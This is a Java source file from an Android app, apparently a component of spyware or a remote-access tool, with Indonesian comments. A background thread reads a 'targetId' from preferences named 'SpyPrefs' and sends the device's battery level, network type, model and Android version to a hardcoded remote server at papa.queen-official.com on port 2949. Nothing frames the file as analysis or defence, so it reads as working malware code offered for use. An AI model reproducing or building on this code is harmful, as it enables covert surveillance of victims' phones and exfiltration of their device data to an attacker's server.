package com.nullx.pp;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * NetworkUtils: Utility untuk komunikasi ke server.
 * Menangani heartbeat dan pengiriman status perangkat secara berkala.
 */
public class NetworkUtils {
    private static final String TAG = "CRPT.NetworkUtils";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/";
    
    public static void sendHeartbeat(Context context) {
        new Thread(() -> {
            try {
                // 1. Ambil targetId dari SharedPreferences
                SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "unknown");
                
                // 2. Ambil data status baterai
                BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
                int battery = (bm != null) ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;
                
                // 3. Ambil data tipe koneksi (WiFi/Data)
                String networkType = getNetworkType(context);
                
                // 4. Susun URL dan Koneksi
                URL url = new URL(SERVER_URL + "heartbeat/" + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(10000); // Timeout agar tidak hang jika koneksi ampas
                conn.setDoOutput(true);
                
                // 5. Susun JSON Payload yang lebih lengkap
                JSONObject payload = new JSONObject();
                payload.put("battery", battery);
                payload.put("network", networkType);
                payload.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                payload.put("android_ver", Build.VERSION.RELEASE);
                payload.put("status", "online");
                
                // 6. Kirim Data
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                }
                
                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Heartbeat sent to server. Response: " + responseCode);
                
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat error: " + e.getMessage());
            }
        }).start();
    }

    /**
     * Helper untuk mengecek tipe koneksi target
     */
    private static String getNetworkType(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if (activeNetwork != null && activeNetwork.isConnected()) {
                if (activeNetwork.getType() == ConnectivityManager.TYPE_WIFI) return "WIFI";
                if (activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE) return "DATA_PLAN";
            }
        }
        return "DISCONNECTED";
    }
}